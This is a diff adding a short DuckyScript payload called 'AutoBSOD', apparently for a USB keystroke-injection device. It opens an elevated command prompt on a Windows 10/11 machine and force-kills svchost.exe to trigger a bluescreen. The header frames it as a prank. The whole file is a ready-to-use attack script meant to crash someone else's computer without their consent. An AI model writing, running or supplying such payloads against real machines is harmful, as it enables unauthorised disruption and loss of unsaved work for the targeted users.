@@ -1,0 +1,17 @@
+REM Author: BadgerClaw
+REM Title: AutoBSOD
+REM Target: Windows 10/11
+REM Description: Bluescreens windows 10 and 11 computers by killing
+REM svchost.exe. This is just a prank, and should cause no permanent 
+REM damage. USE AT YOUR OWN RISK!
+REM NOTE: Requires admin to be enabled on target computer!
+GUI r
+DELAY 100
+STRING cmd
+DELAY 50 
+CTRL SHIFT 
+ENTER
+DELAY 1500
+REM BSoDs windows 10/11 computers
+STRING taskkill.exe /f /im svchost.exe
+ENTER
